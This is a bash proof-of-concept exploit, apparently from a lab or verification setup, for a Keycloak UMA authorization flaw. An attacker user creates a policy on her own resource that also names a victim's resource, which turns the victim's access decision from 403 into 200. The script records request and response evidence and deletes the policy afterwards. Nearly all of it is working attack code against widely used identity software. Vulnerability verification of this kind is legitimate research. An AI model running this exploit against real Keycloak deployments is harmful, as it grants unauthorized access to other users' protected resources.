#!/usr/bin/env bash
set -euo pipefail

# User-triggerable Keycloak UMA cross-resource ownership PoC.

BASE_URL=${BASE_URL:-http://127.0.0.1:8080}
SEED_FILE=${SEED_FILE:-/opt/keycloak-data/seed-info.json}
EVIDENCE_DIR=${EVIDENCE_DIR:-/home/playground/output/attempt_1/evidence}
mkdir -p "$EVIDENCE_DIR"

realm=$(jq -er '.realm' "$SEED_FILE")
client_id=$(jq -er '.client.client_id' "$SEED_FILE")
client_secret=$(jq -er '.client.client_secret' "$SEED_FILE")
attacker=$(jq -er '.attacker.username' "$SEED_FILE")
attacker_password=$(jq -er '.attacker.password' "$SEED_FILE")
attacker_resource=$(jq -er '.attacker.resource_id' "$SEED_FILE")
victim_resource=$(jq -er '.victim.resource_id' "$SEED_FILE")
scope='Scope A'
token_endpoint="$BASE_URL/realms/$realm/protocol/openid-connect/token"
policy_endpoint="$BASE_URL/realms/$realm/authz/protection/uma-policy"

policy_id=''
cleanup_needed=0
cleanup() {
    if [ "$cleanup_needed" -eq 1 ] && [ -n "$policy_id" ]; then
        curl -sS -X DELETE "$policy_endpoint/$policy_id" \
            -H "Authorization: Bearer $marta_token" >/dev/null || true
    fi
}
trap cleanup EXIT

token_json=$(curl -fsS -X POST "$token_endpoint" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode grant_type=password \
    --data-urlencode client_id="$client_id" \
    --data-urlencode client_secret="$client_secret" \
    --data-urlencode username="$attacker" \
    --data-urlencode password="$attacker_password")
marta_token=$(jq -er '.access_token' <<<"$token_json")

request() {
    local name=$1 method=$2 url=$3 body=$4
    local headers_file="$EVIDENCE_DIR/$name.headers"
    local body_file="$EVIDENCE_DIR/$name.body"
    {
        printf '%s %s\n' "$method" "$url"
        printf 'Authorization: Bearer <marta-token-redacted>\n'
        if [ -n "$body" ]; then
            printf 'Content-Type: application/json\n\n%s\n' "$body"
        else
            printf '\n'
        fi
    } > "$EVIDENCE_DIR/$name.request"
    if [ -n "$body" ]; then
        curl -sS -X "$method" "$url" \
            -H 'Content-Type: application/json' \
            -H "Authorization: Bearer $marta_token" \
            --data "$body" \
            -D "$headers_file" -o "$body_file" -w '%{http_code}'
    else
        curl -sS -X "$method" "$url" \
            -H "Authorization: Bearer $marta_token" \
            -D "$headers_file" -o "$body_file" -w '%{http_code}'
    fi > "$EVIDENCE_DIR/$name.status"
    cat "$headers_file" "$body_file" > "$EVIDENCE_DIR/$name.response"
    cat "$EVIDENCE_DIR/$name.status"
}

decision() {
    local name=$1
    cat > "$EVIDENCE_DIR/$name.request" <<EOF
POST $token_endpoint
Authorization: Bearer <marta-token-redacted>
Content-Type: application/x-www-form-urlencoded

grant_type=urn:ietf:params:oauth:grant-type:uma-ticket&client_id=$client_id&client_secret=<redacted>&response_mode=decision&audience=$client_id&permission=$victim_resource%23$scope
EOF
    curl -sS -X POST "$token_endpoint" \
        -H 'Content-Type: application/x-www-form-urlencoded' \
        --data-urlencode grant_type=urn:ietf:params:oauth:grant-type:uma-ticket \
        --data-urlencode client_id="$client_id" \
        --data-urlencode client_secret="$client_secret" \
        --data-urlencode response_mode=decision \
        --data-urlencode audience="$client_id" \
        --data-urlencode permission="$victim_resource#$scope" \
        -H "Authorization: Bearer $marta_token" \
        -D "$EVIDENCE_DIR/$name.headers" \
        -o "$EVIDENCE_DIR/$name.body" \
        -w '%{http_code}' > "$EVIDENCE_DIR/$name.status"
    cat "$EVIDENCE_DIR/$name.headers" "$EVIDENCE_DIR/$name.body" > "$EVIDENCE_DIR/$name.response"
    cat "$EVIDENCE_DIR/$name.status"
}

baseline_status=$(decision baseline_decision)
if [ "$baseline_status" != 403 ] || ! jq -e '.error == "access_denied"' "$EVIDENCE_DIR/baseline_decision.body" >/dev/null; then
    echo "FAIL: baseline was not a denied UMA decision (HTTP $baseline_status)" >&2
    exit 1
fi

policy_body=$(jq -cn \
    --arg name 'marta-cross-user-poc' \
    --arg scope "$scope" \
    --arg attacker_resource "$attacker_resource" \
    --arg victim_resource "$victim_resource" \
    --arg attacker "$attacker" \
    '{name:$name,description:"cross-user authorization PoC",scopes:[$scope],users:[$attacker],resources:[$attacker_resource,$victim_resource]}')
create_status=$(request exploit_create POST "$policy_endpoint/$attacker_resource" "$policy_body")
if [ "$create_status" != 200 ]; then
    echo "FAIL: policy creation was not accepted (HTTP $create_status)" >&2
    exit 1
fi
policy_id=$(jq -er '.id' "$EVIDENCE_DIR/exploit_create.body")
cleanup_needed=1

after_status=$(decision after_decision)
if [ "$after_status" != 200 ] || ! jq -e '.result == true' "$EVIDENCE_DIR/after_decision.body" >/dev/null; then
    echo "FAIL: unauthorized access decision did not become true (HTTP $after_status)" >&2
    exit 1
fi

delete_status=$(request exploit_delete DELETE "$policy_endpoint/$policy_id" '')
if [ "$delete_status" != 204 ]; then
    echo "FAIL: cleanup did not delete the attacker-created policy (HTTP $delete_status)" >&2
    exit 1
fi
cleanup_needed=0

restored_status=$(decision restored_decision)
if [ "$restored_status" != 403 ] || ! jq -e '.error == "access_denied"' "$EVIDENCE_DIR/restored_decision.body" >/dev/null; then
    echo "FAIL: access was not denied again after policy deletion (HTTP $restored_status)" >&2
    exit 1
fi

cat > "$EVIDENCE_DIR/summary.txt" <<EOF
realm=$realm
attacker=$attacker
attacker_resource=$attacker_resource
victim_resource=$victim_resource
scope=$scope
policy_id=$policy_id
baseline_decision_http=$baseline_status
exploit_create_http=$create_status
after_decision_http=$after_status
after_decision_body=$(tr -d '\n' < "$EVIDENCE_DIR/after_decision.body")
exploit_delete_http=$delete_status
restored_decision_http=$restored_status
restored_decision_body=$(tr -d '\n' < "$EVIDENCE_DIR/restored_decision.body")
EOF

echo 'PASS: Marta changed Kolo resource access from 403 to 200 {"result":true}; deletion restored 403.'
